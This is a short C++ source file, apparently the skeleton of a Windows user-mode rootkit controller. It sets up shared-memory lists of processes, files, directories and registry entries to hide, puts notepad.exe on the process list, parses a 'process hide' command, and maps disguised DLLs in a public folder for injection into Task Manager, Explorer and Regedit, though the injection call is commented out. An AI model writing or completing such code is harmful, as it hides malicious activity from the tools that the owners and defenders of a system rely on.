#include <iostream>
#include <Windows.h>
#include <vector>
#include <AccCtrl.h>
#include <Aclapi.h>
#include <unordered_map>
#include "multiDLLInjector.h"

using namespace std;

int main(int argc, char* argv[]){        
    unordered_map<string, vector<string>> injectionMap;
    
    // Create mapped files
    HANDLE processMapped = CreateFileMapping(NULL, NULL, PAGE_READWRITE, 0, 1024, L"processes");
    HANDLE fileMapped = CreateFileMapping(NULL, NULL, PAGE_READWRITE, 0, 1024, L"files");
    HANDLE directoryMapped = CreateFileMapping(NULL, NULL, PAGE_READWRITE, 0, 1024, L"directories");
    HANDLE registryMapped = CreateFileMapping(NULL, NULL, PAGE_READWRITE, 0, 1024, L"registry");

    // Add notepad.exe string to processes mapped file
    LPVOID processMap = MapViewOfFile(processMapped, FILE_MAP_ALL_ACCESS, 0, 0, 1024);
    const char* data = "notepad.exe";
    CopyMemory(processMap, data, strlen(data) + 1);


    // - rootkit.exe process hide processname.exe
    if (argc == 4 && strcmp(argv[1], "process") == 0 && strcmp(argv[2], "hide") == 0) {
		char* processName = argv[3];

	}
    

    // Inject DLL's into processes
    injectionMap["taskmgr.exe"] = { "C:\\Users\\Public\\mscde.dll","C:\\Users\\Public\\msc23.dll"};
    injectionMap["explorer.exe"] = { "C:\\Users\\Public\\mscde.dll" };
    injectionMap["regedit.exe"] = { "C:\\Users\\Public\\mscde.dll" };

    //injectDlls(injectionMap);
}


